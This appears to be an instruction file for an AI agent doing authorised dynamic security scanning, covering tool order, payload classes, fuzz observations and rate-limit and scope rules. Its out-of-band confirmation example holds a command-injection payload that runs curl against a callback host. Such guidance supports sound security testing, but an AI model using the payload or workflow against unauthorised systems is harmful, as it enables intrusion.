---
name: dast-orchestration
description: |
  How to use the lacuna-dast tools in the right order to confirm a
  hypothesis. The order matters: discover the surface, authenticate, baseline,
  then fuzz with observation. Always confirm blind cases via OOB.
---

# DAST orchestration

DAST tools live in the `lacuna-dast` MCP server. They run only in `sast+dast`
mode and only against targets listed in the manifest's
`scan.dast.target.allowed_hosts`. The PreToolUse hook enforces both.

## Order of operations

1. **Authenticate** — `auth_login(flow_name="...")` for each role you need
   to test. If you need to test as two different users (IDOR validation),
   log in twice with different flow names.

2. **Discover the surface** — `endpoint_enum(openapi_url=...)` if an OpenAPI
   spec is available; `crawl(seed_url=..., session=...)` otherwise.

3. **Baseline a request** — Before fuzzing, send the request with a
   "boring" parameter value. Note status, body size, duration. Every
   subsequent fuzz observation compares against this baseline.

4. **Fuzz** — `fuzz_param(method=..., url=..., param_in=..., param_name=...,
   payload_class=..., baseline_value=...)`. Observations include status
   changes, byte-count deltas, time deltas, reflected payloads, and error
   strings. Investigate any payload marked `interesting=True`.

5. **Confirm via direct or OOB.** If a payload produces an interesting
   observation, send a single direct `http_request` with that payload and
   inspect carefully. For blind cases (no direct signal), use OOB:
   `oob_callback_register` → embed the token in the payload via
   `replace_oob_token` → run the fuzzed/direct request → wait → `oob_callback_poll`.

## Choosing the right method

Match `payload_class` to the hypothesis shape:

| Shape | payload_class |
|---|---|
| SQL injection | `sqli` |
| XSS (reflected/stored) | `xss` |
| OS command injection | `cmdi` |
| SSRF | `ssrf` |
| SSTI | `ssti` |
| Path traversal | `path-traversal` |
| XXE | `xxe` |
| NoSQL injection | `nosql` |
| Log4j | `log4j` |
| Open redirect | `open-redirect` |
| CSV / spreadsheet injection | `csv-injection` |

## Param locations

The `param_in` argument controls where the payload goes:

- `query` — `?name=PAYLOAD`. Most common for SQLi, XSS, SSRF.
- `form` — body of `application/x-www-form-urlencoded`. Login forms.
- `json` — JSON body field. Modern APIs.
- `header` — request header. Test for header-injection or auth header bypass.
- `cookie` — cookie value. Test for SQLi-in-session-token style bugs.

## Observation interpretation

`fuzz_param` returns one observation per payload. Fields:

- `status_diff` — `True` if status differs from baseline.
- `byte_diff_pct` — `|cur - base| / base * 100`. > 25% is interesting.
- `time_diff_ms` — `cur - base`. > 3000ms is interesting (probably a time-based SQLi).
- `reflected` — `True` if the payload string appears in the response body.
- `error_signal` — `True` if the body contains a known error pattern (SQL
  errors, stack traces, Java exceptions).
- `interesting` — `True` if any of the above is true.

Read all observations marked `interesting=True`. A handful of them is normal
in a moderately sized fuzz; if dozens are interesting, you're probably
seeing something systemic.

## OOB confirmation pattern

For SSRF, blind RCE, blind SQLi, Log4j, XXE:

```python
# 1. Get a token
token, callback_url = oob_callback_register(label="hyp-xyz-cmdi")

# 2. Run the payload (replace OOB_TOKEN in canned payloads)
http_request(method="POST", url="<base>/endpoint",
              json_body={"x": f"$(curl http://{token}.oob.local/)"})

# 3. Wait for the callback (usually < 30s)
hits = oob_callback_poll(token=token, since_seconds=120)
```

A non-empty `hits` list is irrefutable evidence: the server made an outbound
call to a target whose hostname encodes the token, which the attacker
controls. That's the primitive.

## Header tests

`header_test` is for tests that don't fit fuzz_param's parameter model:

- `security-headers` — does the endpoint set CSP, HSTS, X-Frame-Options, etc.?
- `cors` — does the endpoint reflect arbitrary Origin headers with
  Access-Control-Allow-Credentials?
- `host-injection` — does the server use Host/X-Forwarded-Host headers in
  generated links (password-reset emails, redirects)?
- `smuggling-clte`, `smuggling-tecl` — HTTP request smuggling probes.
  Note: real smuggling confirmation requires raw socket access; these
  probes are best-effort with httpx.

## Rate limit etiquette

The PreToolUse hook applies a per-target rate limit from the manifest
(`scan.dast.safety.rate_limit_rps`, default 10). Don't try to bypass it —
respectful scanning is part of why production-DAST works at all.

## When NOT to DAST

- Hypothesis is in a non-running component (build script, migration, dead code).
- Target host is not in `allowed_hosts` (the hook will deny anyway).
- DAST mode is disabled (you'll be denied by the hook).

For these, fall back to code reading via `code_excerpt` and reasoning. A
SAST-only finding is still a valid finding — the validator's red/blue
dialectic does not require DAST evidence.

## Anti-patterns

- **Fuzz without baseline.** Without a baseline, you can't tell whether a
  500 is interesting or routine.
- **Run all payload classes for one hypothesis.** Pick the one that matches
  the shape; one fuzz per param is enough.
- **Ignore non-interesting observations.** They confirm what works
  *normally* — useful negative evidence.
- **Use destructive methods on production-like targets.** Even with the
  hook permitting it via manifest, prefer GET/HEAD/POST-with-readonly-effect
  whenever possible.
